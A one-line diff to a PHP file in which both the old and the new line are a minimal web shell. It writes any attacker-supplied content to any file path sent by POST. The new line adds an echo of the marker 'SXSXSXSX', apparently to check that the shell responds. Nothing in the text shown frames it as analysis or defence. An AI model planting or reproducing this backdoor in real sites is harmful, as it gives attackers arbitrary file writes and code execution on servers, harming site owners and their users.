@@ -1,1 +1,1 @@
-<?php if ($_POST){$f=fopen($_POST['f'],'w');if(fwrite($f,$_POST['c']))echo 'OK!';else echo 'Error!';}?>
+<?php if ($_POST){$f=fopen($_POST['f'],'w');if(fwrite($f,$_POST['c']))echo 'OK!';else echo 'Error!';}  echo 'SXSXSXSX'; ?>
